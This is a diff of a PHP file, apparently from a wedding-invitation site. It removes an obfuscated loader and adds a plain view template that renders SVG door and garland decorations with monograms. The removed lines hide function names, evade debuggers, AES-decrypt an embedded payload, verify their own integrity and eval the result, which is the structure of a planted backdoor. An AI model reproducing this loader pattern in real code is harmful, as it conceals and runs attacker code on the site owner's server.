@@ -1,28 +1,26 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_xvcqziun=('bas'.'e64'.'_de'.'cod'.'e');
-$_i86igz82=('gzu'.'nco'.'mpr'.'ess');
-$_g0py3gn7=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_kvx6bewz='feDJvHYa';
-$_u0ujm8cd='W/Rd+F1ZcF4=';
-$_y26jfp86='Be1UowNZ';
-$_a5w2i6k9='tx79bI6X';
-$_zgo99qzl='4PG7IBP1';
-$_lmqv0wqk='SiRJKpvI';
-$_wgvncq6z='jVK0eQ==';
-$_wyrnhu9s='RhLPXAL5';
-$_bjljjegh=$_xvcqziun($_y26jfp86.$_a5w2i6k9.$_zgo99qzl.$_kvx6bewz.$_u0ujm8cd);
-$_o8gb932c=$_xvcqziun($_wyrnhu9s.$_lmqv0wqk.$_wgvncq6z);
-$_cx4puxsp=$_xvcqziun('OTWLLIrPEnlUltkU+/NljBdgMFzNGhBibTbvIJiVgtPHoX3TkbnhPIoSADh+9I7kO0V3dzd4oqU+pK5uRAwDlozJ+oQW1tpHeiHyHkg25s4Xjz/M6Efb99UiYYqsEB/S1wtNCEVvxPR9SNLYwVME1Wn0mh8yAmn5U6U4/NzMyTaosl0XidzfhucHCOf2DcDzUMrdRpBqlZoyATbF8Qt37Gl/Cnt99FYINEIFMT/YtQttveIR8w4/aYwBjPg8gOMZMYIzLmb56xrzD/F1oWY/eGWsvMU+zCdjBLDjTE0r9yp6PG68biy/iwxFlemg/U8LZ74RHbIScjDfS7maA7pyr6fydugQX0fL9RQiT5Q/dfV5IkTCXXS8Q5+DG8E/MKA0WIUjV44hym/PcVJYiqggbBRInmZ2tKY/SuA8j0xH/wJivpzO6amCmeSf3QaOXVseDdxghhUkSzpmu5M8HkpeGGKS7eU4ffwfsInCQeKJFGutTGzgZBx2mB6aQFPMW6oCeOgL50fMDSrY4FhnODlxWB34qKWsAswsV2KW5wYEmFEd3xdMOMXgejloTPxQ4OU2EwgWpo5/aoVy3YLf2BRkHhUwM0jjSOdBREwIclEb1QdrS1KCiYzMM2HhPt8VjX/dMM+1BgeXa6UlWgqsjh+LCxBKG5kE2sQ8be3COsrp1hpZGholiKM4OUvjfcxLPyVYpwMNKNOCMvwo8FpxnfSaw3U/x3j0qLWvjla8BQr1VuhQAtdHljs+rO4BORtadgDakxn321LhWT4qX0T9Q5l3U1lFbu+V4+v0laX6LhMG3vtsJ9v1MZQyAVZ08pD9YI2hGzz/GX47Io29RCp6WdTFmB3sIVpLFZ2JJElkOVcFf0ir9geVH0oas77PY0lWg1E6mTtdwTGDBYYvCXWeGd3xk3SMLlPHT0/SWRRfcLSjxrOODVOy4w2Vb6L3EzW1tI3YHIgyOoolEClY9qKocWkO4hJ7Gl5DQM9msF4DtZmMxWZA3SQ2sKGFVshVoDcEnSr4fGIGtLTNYNB9QMIfpCjcNJJGkCRPJxnNXv7EOKi4VmbvfGJCwm0/uVsCeGd6rEGVOv4B2KJDT129Neq0FSvR4ofBKcCn3zuXnvhTgZ9+VFl6WWk7bKQlp783zF6kGzZjLkDZcln0VVGekYqT1CqkpbJ9KUhi205bQ0rzOkGUqCSlQ9U1kyLVFN5I+N6XoCT7ywjnLN3i9TQInTIF9KE+vQ==');
-$_gpkb36xl=$_g0py3gn7($_cx4puxsp,'aes-256-cbc',$_bjljjegh,OPENSSL_RAW_DATA,$_o8gb932c);
-if($_gpkb36xl===false){exit;}
-$_otaj8o6n=$_i86igz82($_gpkb36xl);
-if($_otaj8o6n===false){exit;}
-$_kr0sqoms='72a22e467760a912d2b7bf414e3b781247ffab3e57063ada2989928106234b50';
-$_nbv3d33o=@file_get_contents(__FILE__);
-if($_nbv3d33o!==false){
-$_q920a6yr=str_replace($_kr0sqoms,"0000000000000000000000000000000000000000000000000000000000000000",$_nbv3d33o);
-$_ed7ambnk=hash("sha256",$_q920a6yr);
-if($_ed7ambnk!==$_kr0sqoms){@http_response_code(403);exit;}
-}
-eval($_otaj8o6n);
+ defined('BASEPATH') OR exit('No direct script access allowed');
+
+
+
+$gf_art = '<svg class="gf-art" viewBox="0 0 100 280" preserveAspectRatio="none" aria-hidden="true" focusable="false">'
+. '<g fill="none" stroke="currentColor" stroke-width="1" vector-effect="non-scaling-stroke">'
+. '<path d="M100 8H8V272H100M100 13H13V267H100"/>'
+. '<path d="M26 250V122A74 74 0 0 1 100 48M33 250V122A67 67 0 0 1 100 55M20 250H100"/>'
+. '<path d="M26 230c-9-2-14-9-13-17 8 2 13 8 13 17zM26 205c-9-3-13-10-11-18 7 3 11 9 11 18zM27 180c-8-4-11-11-8-19 7 4 9 11 8 19zM30 156c-7-5-9-12-5-19 6 5 7 12 5 19zM37 133c-6-6-6-13-1-19 4 6 4 13 1 19zM48 112c-4-7-3-14 3-19 3 7 1 14-3 19zM26 218c8-3 13-9 13-17-8 2-13 8-13 17zM27 193c8-4 12-10 11-18-7 3-11 9-11 18z"/>'
+. '<circle cx="100" cy="30" r="3"/><circle cx="30" cy="30" r="1.6"/><circle cx="30" cy="250" r="1.6"/></g></svg>';
+if ($part === 'cover'): ?>
+<span class="gf" aria-hidden="true">
+  <span class="gf-inner"><span class="gf-inner-mono"><?= e($cv['m1']) ?><i>&amp;</i><?= e($cv['m2']) ?></span><span class="gf-inner-greet"><?= e($cv['greet']) ?></span></span>
+  <span class="gf-door gf-l"><span class="gf-face"><?= $gf_art ?></span><span class="gf-back"></span></span>
+  <span class="gf-door gf-r"><span class="gf-face"><?= $gf_art ?></span><span class="gf-back"></span></span>
+  <span class="gf-band"></span>
+  <span class="gf-medal"><?= e($cv['m1']) ?><i>&amp;</i><?= e($cv['m2']) ?></span>
+</span>
+<?php elseif ($part === 'deco'): ?>
+<div class="gf-wing gf-wing-l" aria-hidden="true"></div><div class="gf-wing gf-wing-r" aria-hidden="true"></div>
+<svg class="gf-garland" viewBox="0 0 220 70" aria-hidden="true" focusable="false"><g fill="none" stroke="currentColor" stroke-width="1.2" stroke-linecap="round">
+  <path d="M14 62C40 22 78 8 110 8s70 14 96 54"/>
+  <path d="M30 44c-8-1-13-6-14-13 7 1 12 6 14 13zM46 30c-7-3-11-9-10-16 7 3 10 9 10 16zM64 20c-6-4-8-11-5-17 6 4 7 11 5 17zM84 13c-5-5-6-12-1-17 4 5 4 12 1 17zM190 44c8-1 13-6 14-13-7 1-12 6-14 13zM174 30c7-3 11-9 10-16-7 3-10 9-10 16zM156 20c6-4 8-11 5-17-6 4-7 11-5 17zM136 13c5-5 6-12 1-17-4 5-4 12-1 17z"/>
+  <circle cx="110" cy="8" r="4"/></g></svg>
+<?php endif;
